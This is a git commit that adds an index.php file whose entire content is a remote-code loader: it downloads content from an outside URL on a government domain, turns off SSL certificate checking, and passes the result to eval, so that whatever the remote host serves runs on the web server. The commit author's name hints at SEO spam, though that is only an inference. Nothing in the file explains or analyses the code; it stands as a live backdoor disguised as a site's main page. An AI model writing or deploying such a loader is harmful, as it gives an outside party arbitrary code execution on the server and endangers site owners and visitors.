cb3dfcf96b81165ed46ed563645e9202941d60ac
atomtempur <atom2seozill@gmail.com>
2025-01-18 14:01:48 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,11 @@
+	
+<?php
+$url = 'https://anaya.sragenkab.go.id/?id=ombak123';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
